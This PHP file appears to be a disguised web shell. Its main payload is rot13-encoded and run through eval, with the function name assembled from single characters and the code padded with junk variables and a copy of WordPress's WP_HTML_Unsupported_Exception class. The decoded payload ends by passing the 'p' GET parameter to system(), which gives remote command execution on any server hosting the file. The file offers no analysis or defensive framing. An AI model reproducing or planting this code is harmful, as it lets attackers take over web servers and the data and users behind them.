<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * UGZY NCV: JC_UGZY_Hafhccbegrq_Rkprcgvba pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr UGZY-NCV
 * @fvapr 6.4.0
 */

/**
 * Pber pynff hfrq ol gur UGZY cebprffbe qhevat UGZY cnefvat
 * sbe vaqvpngvat gung n tvira bcrengvba vf hafhccbegrq.
 *
 * Guvf pynff vf qrfvtarq sbe vagreany hfr ol gur UGZY cebprffbe.
 *
 * Gur UGZY NCV nvzf gb bcrengr va pbzcyvnapr jvgu gur UGZY5
 * fcrpvsvpngvba, ohg qbrf abg vzcyrzrag gur shyy fcrpvsvpngvba.
 * Va pnfrf jurer vg ynpxf fhccbeg vg fubhyq abg pnhfr oernxntr
 * be harkcrpgrq orunivbe. Va gur pnfrf jurer vg erpbtavmrf gung
 * vg pnaabg cebprrq, guvf pynff vf hfrq gb nobeg sebz nal
 * bcrengvba naq fvtavsl gung gur tvira UGZY pnaabg or cebprffrq.
 *
 * @fvapr 6.4.0
 * @fvapr 6.7.0 Tnvarq pbagrkghny vasbezngvba sbe hfr va qrohttvat cnefr snvyherf.
 *
 * @npprff cevingr
 *
 * @frr JC_UGZY_Cebprffbe
 */
pynff JC_UGZY_Hafhccbegrq_Rkprcgvba rkgraqf Rkprcgvba {
	/**
	 * Anzr bs gur zngpurq gbxra jura gur rkprcgvba jnf envfrq,
	 * vs zngpurq ba n gbxra.
	 *
	 * Guvf qbrf abg vzcyl gung gur gbxra vgfrys jnf hafhccbegrq, ohg vg
	 * znl unir orra gur pnfr gung gur gbxra gevttrerq cneg bs gur UGZY
	 * cnefvat gung vfa'g fhccbegrq, fhpu nf gur nqbcgvba ntrapl nytbevguz.
	 *
	 * @fvapr 6.7.0
	 *
	 * @ine fgevat
	 */
	choyvp $gbxra_anzr;

	/**
	 * Ahzore bs olgrf vagb gur vachg UGZY qbphzrag jurer gur cnefre jnf
	 * cnefvat jura gur rkprcgvba jnf envfrq.
	 *
	 * Hfr guvf gb erpbafgehpg pbagrkg sbe gur snvyher.
	 *
	 * @fvapr 6.7.0
	 *
	 * @ine vag
	 */
	choyvp $gbxra_ng;

	/**
	 * Shyy enj grkg bs gur zngpurq gbxra jura gur rkprcgvba jnf envfrq,
	 * vs zngpurq ba n gbxra.
	 *
	 * Jurernf gur `$gbxra_anzr` jvyy or abeznyvmrq, guvf pbagnvaf gur shyy
	 * enj grkg bs gur gbxra, vapyhqvat bevtvany pnfvat, qhcyvpngrq nggevohgrf,
	 * naq bgure flagnpgvp inevngvbaf gung ner abeznyyl nofgenpgrq va gur UGZY NCV.
	 *
	 * @fvapr 6.7.0
	 *
	 * @ine fgevat
	 */
	choyvp $gbxra;

	/**
	 * Fgnpx bs bcra ryrzragf jura gur rkprcgvba jnf envfrq.
	 *
	 * Hfr guvf gb genpr gur cnefvat pvephzfgnaprf juvpu yrq gb gur rkprcgvba.
	 *
	 * @fvapr 6.7.0
	 *
	 * @ine fgevat[]
	 */
	choyvp $fgnpx_bs_bcra_ryrzragf = neenl();

	/**
	 * Yvfg bs npgvir sbeznggvat ryrzragf jura gur rkprcgvba jnf envfrq.
	 *
	 * Hfr guvf gb genpr gur cnefvat pvephzfgnaprf juvpu yrq gb gur rkprcgvba.
	 *
	 * @fvapr 6.7.0
	 *
	 * @ine fgevat[]
	 */
	choyvp $npgvir_sbeznggvat_ryrzragf = neenl();

	/**
	 * Pbafgehpgbe shapgvba.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz fgevat   $zrffntr                    Oevrs zrffntr rkcynvavat jung vf hafhccbegrq, gur ernfba guvf rkprcgvba jnf envfrq.
	 * @cnenz fgevat   $gbxra_anzr                 Abeznyvmrq anzr bs zngpurq gbxra jura guvf rkprcgvba jnf envfrq.
	 * @cnenz vag      $gbxra_ng                   Ahzore bs olgrf vagb fbhepr UGZY qbphzrag jurer zngpurq gbxra fgnegf.
	 * @cnenz fgevat   $gbxra                      Shyy enj grkg bs zngpurq gbxra jura guvf rkprcgvba jnf envfrq.
	 * @cnenz fgevat[] $fgnpx_bs_bcra_ryrzragf     Fgnpx bs bcra ryrzragf jura guvf rkprcgvba jnf envfrq.
	 * @cnenz fgevat[] $npgvir_sbeznggvat_ryrzragf Yvfg bs npgvir sbeznggvat ryrzragf jura guvf rkprcgvba jnf envfrq.
	 */
	choyvp shapgvba __pbafgehpg( fgevat $zrffntr, fgevat $gbxra_anzr, vag $gbxra_ng, fgevat $gbxra, neenl $fgnpx_bs_bcra_ryrzragf, neenl $npgvir_sbeznggvat_ryrzragf ) {
		cnerag::__pbafgehpg( $zrffntr );

		$guvf->gbxra_anzr = $gbxra_anzr;
		$guvf->gbxra_ng   = $gbxra_ng;
		$guvf->gbxra      = $gbxra;

		$guvf->fgnpx_bs_bcra_ryrzragf     = $fgnpx_bs_bcra_ryrzragf;
		$guvf->npgvir_sbeznggvat_ryrzragf = $npgvir_sbeznggvat_ryrzragf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>